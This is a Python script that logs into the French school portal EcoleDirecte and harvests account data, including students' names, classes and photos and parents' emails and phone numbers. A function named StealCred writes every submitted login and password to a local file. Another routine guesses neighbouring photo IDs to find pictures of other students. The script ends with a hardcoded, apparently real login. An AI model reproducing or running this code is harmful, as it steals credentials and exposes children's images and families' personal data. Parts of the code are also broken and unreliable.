import requests
from sys import exit

class Ecoledirecte():
	def __init__(self, identifiant, password):
		self.identifiant = str(identifiant)
		self.password = str(password)
		try:
			self.url = "https://vmws22.ecoledirecte.com/v3/login.awp?data={%22identifiant%22:%22" + f"{identifiant}" + "%22,%22motdepasse%22:%22"+f"{password}"+"%22}"
			self.req = requests.post(self.url)
			if self.req.status_code != 200:
				print("Wrong ids")
				return False
		except:
			print("An error occured")
			return False
		#debug :
		self.json = self.req.json()
		self.text = self.req.text
		#::
		self.photos = {}
		roots = []
		pto = []
		self.otherpic = []
		classes = []
		names = []
		for x in range(0,4):
			try:
				phot = self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]["photo"]
				pto.append(phot)
			except IndexError:
				pass
			except KeyError:
				pass
			try:
				root = phot.split("/")[-1][:-4]
				roots.append(root)
			except IndexError:
				pass
			except KeyError:
				pass
			try:
				classe = self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]["classe"]['libelle']
				classes.append(classe)
			except IndexError:
				pass
			except KeyError:
				pass
			try:
				names.append(self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]['prenom']+" "+self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]['nom'])
			except IndexError:
				pass
			except KeyError:
				pass
		self.photos["name"] = names
		self.photos["entirepath"] = pto
		self.photos["classes"] = classes
		self.photos["roots"] = roots
		try:
			self.photos["all"] = roots.copy()
			del roots
			portable = {}
			portable[self.req.json()['data']['accounts'][0]["profile"]["email"]] = [self.req.json()['data']['accounts'][0]["profile"]["telPortable"], self.req.json()['data']['accounts'][0]["profile"]["telPortableConjoint"]]
		except IndexError:
			pass
		try:
			nomprincipal = self.req.json()['data']['accounts'][0]["prenom"] + " " + self.req.json()['data']['accounts'][0]["particule"] + self.req.json()['data']['accounts'][0]["nom"]
		except IndexError:
			pass
		try:	
			codeuai = self.req.json()['data']['accounts'][0]["codeOgec"]
		except IndexError:
			pass
		try:
			email = self.req.json()['data']['accounts'][0]["email"]
		except IndexError:
			pass
		try:
			etablissement = self.req.json()['data']['accounts'][0]["nomEtablissement"]
		except IndexError:
			pass
		def StealCred():
			try:
				o = open("credlist.txt", "a")
				o.write(self.identifiant+":"+self.password+"\n")
				o.close()
			except Exception as e:
				print(e)
				return False
		StealCred()
		def GetOtherPic():
			pat = "/".join(self.photos["entirepath"][0].split("/")[2:-1])+"/"
			rout = self.photos["entirepath"][0].split("/")[-1][:-6]
			for test in range(int(self.photos["entirepath"][0].split("/")[-1][6:-4])-2,int(self.photos["entirepath"][0].split("/")[-1][6:-4])+2):
				try:
					rm = requests.get("http://"+pat+rout+str(test)+".jpg").text
				except:
					pass
				else:
					if not "Error" in rm:
						self.otherpic.append("http://"+pat+rout+str(test)+".jpg")
		GetOtherPic()
		def OpenOtherPictureFound(self):
			try:
				import webbrowser as web
			except ModuleNotFoundError:
				print("Install webbrowser first")
				return False
			if not GetOtherPic():
				return False
			for i in self.otherpic:
				try:
					w = web.open_new_tab(i)
				except:
					return False
				if not w:
					print("Unable to open your default webbrowser")
					return False
				


res =Ecoledirecte("gregetsteph","artiste3873")
#print(res.text) # display server response (for debugging)
#print(res.photos) #display all
#print(res.otherpic) #display pictures found
#res.OpenOtherPictureFound() #open other pictures found on your default webbrowser